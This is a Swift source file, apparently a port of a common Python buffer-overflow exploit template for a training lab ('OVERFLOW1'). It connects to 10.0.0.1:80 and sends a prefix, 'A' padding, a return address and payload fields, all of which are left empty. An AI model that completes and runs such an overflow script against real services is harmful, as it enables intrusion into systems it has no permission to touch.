

import Socket
import Foundation
import Darwin.C.stdlib

//// Returns the number of arguments passed to the program.
//let argumentCount:Int = CommandLine.arguments.count

//// Returns an array/list(pythonic) of arguments passed to the program.
//let args = CommandLine.arguments
let banner: String =
    #"""
Krypted's Blufferflower
         ______     __  __     ______   ______
        /\  == \   /\ \/\ \   /\  ___\ /\  ___\
        \ \  __<   \ \ \_\ \  \ \  __\ \ \  __\
         \ \_____\  \ \_____\  \ \_\    \ \_\
          \/_____/   \/_____/   \/_/     \/_/
          
                                    
"""#

print(banner)
// ip = "10.0.0.1"
let ipAddress : String = "10.0.0.1"

// port = 80
let portNumber : Int32 = 80;

// prefix = "OVERFLOW1 "
let prefix : String = "OVERFLOW1 ";

// offset = 0
let offset : Int = 0;

// overflow = "A" * offset
let overflow : String = String(repeating: "A", count: offset);

// retn = ""
let retn : String  = "";

// padding = ""
let padding : String  = "";

// payload = ""
let payload : String  = "";

// postfix = ""
let postfix : String  = "";

// buffer = prefix + overflow + retn + padding + payload + postfix
let buffer : String = prefix + overflow + retn + padding + payload + postfix;

// Socket timeout in seconds
let timeOutInSeconds: UInt = 10



//try:
//    s.connect((ip, port))
//    print("Attempting buffer      ")
//    s.send(buffer + "\r\n")
//    print("Buffer Sent")
//except:
//    print("Connection failed")

let sock : Socket;
do{
    // s = socket.socket(socket.AF_INET, socket.sock_STREAM)
    sock = try Socket.create();
    print("[+] Socket successfully created!. ...")
} catch{
    print("[*] Failed to create socket!!")
    exit(EXIT_SUCCESS);
}
//try:
do{
    // s.connect((ip, port))
    try sock.connect(to: ipAddress, port: portNumber, timeout: (timeOutInSeconds * 1000))
    
    // print("Attempting buffer      ")
    print("[+] Attempting buffer overflow!!!    ")
    
    // s.send(buffer + "\r\n")
    do {
        try sock.write(from: buffer + "\r\n")
        
        //    print("Buffer Sent")
        print("[+] Buffer Sent")
    } catch {
        print("[*] Error writing to socket!! ...")
    }
// except:
} catch {
//  print("Connection failed")
    print("[*] Connection failed")
}





